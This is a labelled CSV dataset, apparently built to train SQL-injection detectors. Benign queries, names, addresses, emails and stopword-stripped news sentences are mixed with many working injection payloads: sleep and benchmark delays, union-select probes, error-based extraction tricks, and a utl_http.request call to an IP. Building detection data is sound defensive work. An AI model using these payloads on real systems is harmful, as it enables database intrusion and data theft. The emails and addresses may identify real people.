Sentence,Label
"torre-pacheco 35,",0
SELECT COUNT ( DISTINCT corner )  FROM finish,0
SELECT melted FROM strange,0
alcarrs,0
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
"1""  )   as uuth where 8555  =  8555 union all select null,null#",1
" SELECT column_name ( s )  FROM together,summer",0
4.28192E+015,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( 'pfle' like 'pfle,1
" Among initiatives , Burfien wants organise study days young people , inviting famous faces studied theology ",0
"calle suceso terrero 68, 7a",0
"c/ murillo, 106 5c",0
farid,0
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1
" The system , officially became operational yesterday , importance Sulzbachweg / Kirchstrasse junction ",0
"admin""  )   or   (  ""1""  =  ""1",1
"1%"" and elt ( 1210 = 1210,sleep ( 5  )  )   and ""%"" = """,1
SELECT TOP 50 PERCENT * FROM chamber SELECT * FROM terrible FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM blow,0
"select pg_sleep  (  5  )   and   (  ""%""  =  """,1
" When transition-based parsing consumes stream words left right shift-reduce decoding algorithm, punctuation symbols predicted word based contexts parsing tree",0
88833808b,0
-7999 )  or 8422 = 1336,1
thieu,0
1'  )  )   )  and  ( 8982 = 8027 ) *8027 and   (  (   ( 'qkrv' = 'qkrv,1
"-2434 )  union all select 8310,8310,8310,8310,8310--",1
joan pelliser,0
"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",1
santa eufemia del arroyo,0
" As men , I expect seeing lot zombies , thanks The Walking Dead I &apos;ll bet Daft Punk space men make Instagram feeds year ",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262327 )  ORDER BY meta_id ASC",0
SELECT AVG ( beginning ) FROM lower SELECT SUM ( exchange ) ,0
"llosa de ranes, la",0
11693,0
"burgos, s/n, 1f",0
"calle mariano garcia, s/n",0
dudas,0
1755430975595986,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3792 )  ORDER BY meta_id ASC",0
SELECT AVG ( know ) FROM toward,0
"1%' union all select null,null,null,null--",1
"1 )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ",1
"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'zaes'  =  'zaes,1
telema,0
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1'|| ( select 'yrau' where 7860 = 7860 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  )  ||'",1
"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( 'istb' = 'istb",1
SELECT TOP 3 * FROM spider WHERE hunt = 'high',0
vartan,0
novendial,0
1305900000000000,0
"avenida democracia, 106 4?g",0
SELECT * FROM future WHERE already = 'letter',0
1 )  as wiyx where 6515 = 6515,1
roco del valle,0
teulada,0
2499149169058216,0
"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",1
hagon_macina@busquedadeempleo.uy,0
SELECT * FROM both 3 SELECT * FROM task,0
"1 )  as wvpl where 9791 = 9791 and make_set ( 3491 = 9067,9067 ) --",1
durham@copiar.com.ke,0
10630,0
22584,0
19262,0
"1 )  as ghew where 6441 = 6441 union all select null,null--",1
887551000000000,0
02683341t,0
SELECT sing ( s )  FROM deeply LEFT JOIN,0
-5585' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ,1
espana@flabingo.dk,0
barceo,0
"make_set ( 5679 = 9769,9769 ) ",1
" SELECT * FROM lonely ORDER BY correctly, meal",0
-7277  )  )   )  order by 1#,1
"-3364%""   )    )     )   union all select 5464--",1
calle la fuente 116 2?e,0
siefert,0
"1%""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""%""  =  """,1
salamandrino,0
SELECT spent ( s )  FROM chief SELECT long FROM sum,0
-9103' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and 'nlvq' = 'nlvq,1
-1385'  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( 'mjjd' = 'mjjd,1
bustillo de la vega,0
"1  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 1164 = 1164",1
 We conduct experiments IWSLT data TDT4 test data sets,0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,1
SELECT TOP 3 * FROM has WHERE frequently = 'slipped',0
ridgely.loyat@cbgerindote.sk,0
"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT knew ( s )  FROM know SELECT darkness ( s ) ,0
cobo,0
"   SELECT grade, reason, automobileFROM no WHERE obtain  IS NOT NULL",0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",1
" It cannot explain National Security Agency collect data private lives Americans , prosecuting whistle-blowers reveal government wrongdoing ",0
tiza,0
1'||  (  select 'pmpd' where 9803  =  9803,1
-6567'   )    )    union all select 3217#,1
"-8550"" )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""kyad"" = ""kyad",1
33300,0
1' where 9544  =  9544,1
1'+ ( select 'lcru' where 3215 = 3215,1
"1"" where 9173 = 9173 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",1
"  SELECT * FROM task WHERE every NOT IN  ( 'sides', 'typical', 'headed' )  ",0
"1'  )   union all select null,null,null,null,null,null,null#",1
alisik-koller@coreserv.zm,0
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",1
"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1
vallabri visglerio,0
SELECT AVG ( thought ) FROM forget SELECT SUM ( cutting ) ,0
"1"" )  as pobe where 1704 = 1704",1
"1""  )  )   as rign where 1604 = 1604 and 3661 = 3054--",1
bluethne,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu",1
"1"" where 9521 = 9521 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --",1
" &quot; This topic many years &apos;t fundamentally changed current discussion , &quot; says Kurt Bock , chief executive chemical maker BASF ",0
ginard xabe,0
" SELECT * FROM Customers  WHERE Country IN  ( 'Germany', 'France', 'UK' ) ;",0
"1' )  union all select null,null,null,null,null,null,null,null--",1
"1%' )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262331 )  ORDER BY meta_id ASC",0
kuravlev@minimizar.ve,0
SELECT AVG ( relationship ) FROM when SELECT SUM ( consist ) ,0
SELECT * FROM trick FETCH FIRST 3 ROWS ONLY,0
porfidio,0
lamia,0
SELECT COUNT ( than ) FROM bring,0
29142280s,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""unju"" = ""unju",1
"-9032  )  )   union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",1
SELECT * FROM bicycle WHERE slabs = 'position'  OR breathe = 'settlers',0
6ho7rca5u16,0
"-4300""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""klbu""  =  ""klbu",1
!d12car3ad1ra,0
1'  )   as ibaw where 2130  =  2130 and 9198  =  9198--,1
1' )  as bihs where 4197 = 4197,1
1 where 5080 = 5080,1
" Snowden ready &quot; cooperate &quot; Germany US surveillance Edward Snowden , US intelligence whistleblower , declared willing travel Berlin give evidence German parliament US National Security Agency director Keith Alexander fail provide answers activities ",0
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'asdc' like 'asdc",1
47318,0
"1""   )    )    rlike   (  select   (  case when   (  8179  =  1246  )   then 1 else 0x28 end   )    )    and    (    (   ""xxeu""  =  ""xxeu",1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and ""%"" = """,1
"1"" )  where 5828 = 5828 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
-9644  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  5616 = 5616,1
SELECT TOP 3 * FROM amount,0
"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,1
"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",1
"-6809""  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""nfnf"" = ""nfnf",1
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""ynde""  =  ""ynde",1
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null--",1
"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
8901603144998796,0
dariela,0
 (  7098  =  7098 and sleep  (  5   )    ) ,1
1   )    )    order by 1#,1
"1%""  )  )   and make_set ( 8403 = 8403,8899 )  and   (  (  ""%"" = """,1
9.7668E+015,0
mariana,0
oropesa del mar/orpesa,0
asaeteadora,0
 Piercing beep disturbs residents Rhenus Midgard also invested highly land They stockpile coal arrives ships ,0
1'   )    )    as tley where 3539  =  3539,1
"-2325  )   union all select 4692,4692,4692,4692#",1
"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1
berleand@campanasextractoras.la,0
qu1s3da,0
FROM  ( SELECT DISTINCT species FROM identity ) ,0
rev8nir,0
woolgar@awat.gov,0
"1' in boolean mode  )   union all select null,null,null#",1
37130,0
1  )  )   as uadn where 9588 = 9588 rlike sleep ( 5 ) #,1
"c/ paraguay 112,",0
SELECT TOP 50 PERCENT * FROM whole,0
3891909303541723,0
"1, ( select  ( case when  ( 8392 = 8404 )  then 1 else 8392* ( select 8392 from information_schema.character_sets )  end  )  )  ",1
" Renamo notorious rebel movement , initially backed white-ruled Rhodesia South Africa &apos;s apartheid government part efforts destabilise country &apos;s independent government ",0
 Henne also mentioned new mother child hospital Nouakchott This particularly interesting time Nagold set away maternity clinic ,0
SELECT * FROM during WHERE mind = 'walk'  OR sound = 'since',0
jayavant,0
SELECT TOP 50 PERCENT * FROM discover,0
"1' in boolean mode )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1
"1' )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1
"1   )    )    as faxr where 7972  =  7972 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT COUNT ( spent )  FROM cut,0
SELECT * FROM pair WHERE identity NOT LIKE '[chain]%',0
SELECT * FROM fireplace WHERE brick IN  ( SELECT green FROM type ) ,0
reason@cajucar.br,0
"1"" )  where 6843 = 6843 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --",1
"-1550%""   )    )     )   order by 1--",1
"1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"  SELECT MINUTE ( ""23:59:59"" ) ;",0
31282,0
6173,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,1
portillo de toledo,0
alvarez 35,0
levi@coivoco.gr,0
"  SELECT * FROM long WHERE contain NOT IN  ( 'southern', 'two', 'desk' )  ",0
SELECT AVG ( furniture ) FROM luck SELECT SUM ( anyone ) ,0
SELECT consonant ( s )  FROM firm,0
1'  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  'pemj' = 'pemj,1
jasper,0
SELECT * FROM kids WHERE avoid BETWEEN '1996-07-01' AND '1996-07-31',0
"calle silvestre peromarta 60,",0
3245,0
pujolaso faucheux,0
bilbao calsada,0
syun,0
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'zeum'  =  'zeum",1
"1'|| ( select 'zifu' from dual where 4822 = 4822 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
09195,0
br8c99ma4290,0
adu7cir,0
" The favourites , Andre Maier / Matthias Bronner , tied Michael Klippel Sadmin Osmicic (both teams SG Rohrweiler), meaning last two games produce victor ",0
canellas redolad,0
 Anticipation attack: This also Obama &apos;s drone philosophy practices work ,0
"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""urgd""  =  ""urgd",1
SELECT TOP 3 * FROM teacher WHERE soap = 'tail' SELECT * FROM facing,0
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""htyi""  =  ""htyi",1
"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",1
"1"" )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
"1""  )  )   )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""ksxz"" = ""ksxz",1
"calle aluders, 96",0
"1""  )  )   and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (  ""gxqq"" = ""gxqq",1
"  (  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  ",1
" In spite shutdown , able visit Statue Liberty second day , climb statue foot ",0
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1
"1'  )  )   and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
1 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) -- xwoo,1
if ( 7899 = 7899 )  select 7899 else drop function zbbp--,1
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and ""pxix"" = ""pxix",1
avantrn,0
"1"" where 1852 = 1852 union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM touch 3 SELECT * FROM military,0
SELECT * FROM invented ORDER BY finger,0
1 where 4003 = 4003 union all select null--,1
"select * from generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   limit 1--",1
"1""  )   where 9223  =  9223 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
1  )  )   union all select null--,1
gerino,0
craig@youtubeanunciox.gf,0
1' and 7533  =  7533 and 'clqy' like 'clqy,1
"1"" )  union all select null--",1
"1' )  where 4297 = 4297 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,1
begley,0
1 where 7425  =  7425 rlike   (  select   (  case when   (  4056  =  3196  )   then 1 else 0x28 end   )    )   --,1
"1%"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""%"" = """,1
santa fe de mondjar,0
"1' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( 'osov' like 'osov",1
SELECT * FROM diagram WHERE string = 'bicycle' FETCH FIRST 3 ROWS ONLY,0
thorpe,0
"  SELECT * FROM lay WHERE breathe IN  ( 'period', 'modern', 'similar' )  ",0
nedar,0
c4e32788ia,0
1  )   where 1487  =  1487,1
"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",1
SELECT * FROM breeze WHERE find BETWEEN drop09/01/1996blind AND dish15/31/1996rabbit,0
6743669195924554,0
"1"" )  as nraw where 7984 = 7984 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,0
1' rlike sleep ( 5 ) #,1
8937,0
1 )  as mtda where 3951 = 3951,1
"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""xmrq""  =  ""xmrq",1
"-9820"" or 1038  =  7502#",1
ernesto,0
kania@internacionalexpofloralzaragoza2014.se,0
"-1510'  )  )   )  union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
"  SELECT * FROM string WHERE stranger NOT IN  ( 'swim', 'art', 'arrive' )  ",0
"-4280%""   )    )     )   union all select 7981,7981--",1
7812370000000000,0
SELECT * FROM  ( SELECT baseball FROM should ) ,0
ciuffini@firstchoicecoffee.ge,0
edel,0
"1""  )  )   as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
" In past , good financial situation meant local authorities could away high municipal rates ",0
SELECT offer ( s FROM salmon RIGHT JOIN,0
SELECT * FROM back WHERE real = 'major' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( movie ) FROM modern,0
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",1
SELECT COUNT ( forget ) FROM husband,0
SELECT * FROM  ( SELECT tie FROM leather ) ,0
SELECT * FROM strange WHERE rabbit BETWEEN '1996-07-01' AND '1996-07-31',0
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""uosc""  =  ""uosc",1
"  SELECT * FROM building WHERE remain NOT IN  ( 'blanket', 'printed', 'eager' )  ",0
d76en3r9n8z01,0
"victoria, la",0
SELECT aside ( s )  FROM master UNION,0
"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx",1
5011187157349121,0
SELECT COUNT ( instead ) FROM down,0
presta,0
villasandino,0
" SELECT * FROM hurt ORDER BY longer, me",0
1'+ ( select 'dpun' where 4760 = 4760,1
2278515903267835,0
select  ( case when  ( 9696 = 2874 )  then 1 else 9696* ( select 9696 from master..sysdatabases )  end ) --,1
1380670000000000,0
"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",1
"c/ rio avia, 105, 2?h",0
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
SELECT COUNT ( DISTINCT afraid )  FROM stock,0
"1""  )  )   as zgig where 5748 = 5748 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
c/ paralela al c/jon quebradizo 36,0
pundyk,0
salinillas de bureba,0
SELECT * FROM doing,0
co80j44l4,0
"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # kkmw",1
zahira,0
 Syria submitted plan total destruction chemical weapons approved next month OPCW &apos;s executive committee ,0
briant,0
34295530t,0
drake3,0
1'+  (  select 'zgtu' where 8419  =  8419,1
-2756' where 6156 = 6156 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
1  )   as ptxw where 9873  =  9873,1
acebes matiz,0
pontigo,0
lora de estepa,0
SELECT mirror ( s )  FROM pictured UNION,0
SELECT TOP 3 * FROM equipment,0
-2174'  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  'dyyg' = 'dyyg,1
-5350  )  )   or 9323 = 9323#,1
8534,0
gasser ortega,0
r1pie0go,0
"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",1
lierde.vaverka@2horas.wf,0
"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",1
"1""  )   where 5196  =  5196 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT location FROM choice,0
" Astronomers already found 1,000 planets near stars ",0
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykxz'  =  'ykxz",1
3074022895871752,0
select case when 3661 = 9315 then 1 else null end--,1
2145810000000000,0
zarrapastrosamente,0
calle lovaina s/n 7e,0
5005,0
1 where 7516 = 7516 union all select null#,1
1%' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and '%' = ',1
"1"" )  as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
1'+  (  select sijr where 7250  =  7250,1
 &quot; Seasonal job offers staff hotel restaurant businesses coming since September ,0
" select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1
"1%""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""%""  =  """,1
"carrer violas, 60,",0
SELECT * FROM satellites WHERE studied = 'but'  OR syllable = 'film',0
48263928s,0
SELECT * FROM what,0
